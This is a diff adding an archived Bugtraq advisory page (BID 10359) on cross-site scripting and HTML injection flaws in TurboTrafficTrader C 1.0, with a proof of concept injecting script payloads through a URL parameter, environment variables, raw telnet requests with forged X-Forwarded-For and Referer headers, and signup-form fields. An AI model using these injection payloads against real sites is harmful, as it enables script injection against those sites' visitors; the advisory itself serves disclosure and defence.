@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid10359<p><b><span style="font-size: 18pt;">TurboTrafficTrader C Multiple Cross-Site Scripting and HTML Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/10359/info">info</a><br><a href="http://www.securityfocus.com/bid/10359/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/10359/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/10359/solution">solution</a><br><a href="http://www.securityfocus.com/bid/10359/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				10359
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 17 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 17 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Kaloyan Olegov Georgiev disclosed these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					TurboTrafficTrader TurboTrafficTrader C 1.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required, but Kaloyan Olegov Georgiev has supplied the following proof of concept code and examples:<br/><br/>http://www.example.com/cgi-bin/ttt-out?link=testing%20%3Cscript%3Ealert('from_browser_insert');%3C/script%3E<br/>http://www.example.com/cgi-bin/ttt-out?link=testing%20&lt;script&gt;alert('from_browser_insert');&lt;/script&gt;<br/><br/>export REMOTE_ADDR="127.0.0.1&lt;script&gt;alert('ip_inject');&lt;/script&gt;"<br/>./ttt-in will load one bad record for IP<br/>export HTTP_X_FORWARDED_FOR="10.0.0.1&lt;script&gt;alert('proxy insertion');&lt;/script&gt;" <br/>./ttt-in will load an XXSed proxy record<br/><br/>Raw connection example:<br/>telnet www.example.com 80<br/>Trying www.example.com...<br/>Connected to www.example.com.<br/>Escape character is '^'.<br/>GET /cgi-bin/ttt-in HTTP/1.1<br/>X-Forwarded-For: 192.168.0.1&lt;script&gt;alert('proxy_insert');&lt;/script&gt;<br/>Host: www.example.com<br/><br/>telnet www.example.com 80<br/>Trying www.example.com...<br/>Connected to www.example.com.<br/>Escape character is '^'.<br/>GET /cgi-bin/ttt-in HTTP/1.1<br/>X-Forwarded-For: 192.168.0.6&lt;script&gt;alert('proxy_insert');&lt;/script&gt;<br/>Referer: http://www.referrer.com"&lt;script&gt;alert('referrer_inject');&lt;/script&gt;"<br/>Host: www.example.com<br/><br/>When signing up for a new account:<br/>Site name = Name"&lt;script&gt;window.open('http://www.example.com');&lt;/script&gt;<br/>Site URL = http://www.example.com"&lt;script&gt;alert('name_inject');&lt;/script&gt;<br/>Webmaster e-mail = email@example.com"&lt;script&gt;alert('email_inject');&lt;/script&gt;<br/>Webmaster ICQ = 123456"&lt;script&gt;alert('ICQ_inject');&lt;/script&gt;
+	
+		<ul>
+</ul>
+</div>
